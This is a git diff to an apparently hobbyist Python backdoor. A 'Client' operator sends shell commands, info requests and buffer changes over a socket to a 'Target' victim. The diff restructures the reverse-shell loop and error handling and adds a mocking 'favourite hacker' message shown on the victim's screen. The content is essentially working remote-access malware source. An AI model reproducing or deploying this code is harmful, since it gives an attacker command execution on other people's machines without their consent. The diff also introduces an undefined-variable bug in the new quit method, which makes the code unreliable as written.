@@ -29,26 +29,20 @@ class Client(Machine):
         self.s.connect((self.host, self.port))
 
     def reverse_shell_send_command(self):
-        self.s.send(str.encode("shell"))
-        print("Welcome into the Shell Monitor: \n")
-        print("-->", end=" ")
-        while True:
-            cmd = input("")
-            if len(str.encode(cmd)) > 0:
-                self.s.send(str.encode(cmd, "utf-8"))
-                client_response = str(self.s.recv(self.buffer), "utf-8")
-                print(client_response, end="")
-                if cmd == "quit":
-                    break
-
-    def quit(self):
         try:
-            self.s.send(str.encode("quit"))
-            response_target = self.s.recv(self.buffer)
-            print(response_target.decode("utf-8"))
+            self.s.send(str.encode("shell"))
+            print("Welcome into the Shell Monitor: \n")
+            print("-->", end=" ")
+            while True:
+                cmd = input("")
+                if len(str.encode(cmd)) > 0:
+                    self.s.send(str.encode(cmd, "utf-8"))
+                    client_response = str(self.s.recv(self.buffer), "utf-8")
+                    print(client_response, end="")
+                    if cmd == "quit":
+                        break
         except ConnectionResetError:
-            print("the target is already closed")
-        super().quit()
+            self.quit()
 
     def getinfo(self, info):
         try:
@@ -58,9 +52,7 @@ class Client(Machine):
             info = self.s.recv(self.buffer)
             print(info.decode("utf-8"))
             input("\n\nPress ENTER")
-        except ConnectionResetError as msg:
-            print("An existing connection had to be closed by the target. \nError: " + str(msg))
-            print("this programme is shutting down...")
+        except ConnectionResetError:
             self.quit()
 
     def print_target(self, print_bool):
@@ -70,9 +62,21 @@ class Client(Machine):
             self.s.send(str.encode("print_target_False"))
 
     def set_target_buffer(self, size):
-        self.s.send(str.encode("buffer_size"))
-        self.s.send(str.encode(str(size)))
-        print("Buffer size: " + str(self.buffer))
+        try:
+            self.s.send(str.encode("buffer_size"))
+            self.s.send(str.encode(str(size)))
+            print("Buffer size: " + str(self.buffer))
+        except ConnectionResetError:
+            self.quit()
+
+    def quit(self):
+        try:
+            self.s.send(str.encode("quit"))
+            response_target = self.s.recv(self.buffer)
+            print(response_target.decode("utf-8"))
+        except ConnectionResetError:
+            print("We notice that the connection is closed.. \nError: " + str(msg))
+        super().quit()
 
 
 # Target is the server
@@ -106,8 +110,8 @@ class Target(Machine):
                   str(self.information[1]))
 
     def what_to_do(self):
-        while True:
-            try:
+        try:
+            while True:
                 instruction = self.s.recv(self.buffer)
                 instruction = instruction.decode("utf-8")
                 if instruction == "quit":
@@ -117,6 +121,7 @@ class Target(Machine):
                     break
                 elif instruction == "print_target_True":
                     self.print = True
+                    print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                 elif instruction == "print_target_False":
                     self.print = False
                 elif instruction == "shell":
@@ -127,10 +132,10 @@ class Target(Machine):
                     self.getinfo_target_cmd(instruction)
                 elif instruction == "buffer_size":
                     self.change_buffer_size()
-            except ConnectionResetError as msg:
-                if self.print:
-                    print("Error : " + msg)
-                self.quit()
+        except ConnectionResetError as msg:
+            if self.print:
+                print("Error : " + str(msg))
+            self.quit()
 
 
     def reverse_shell_target(self):
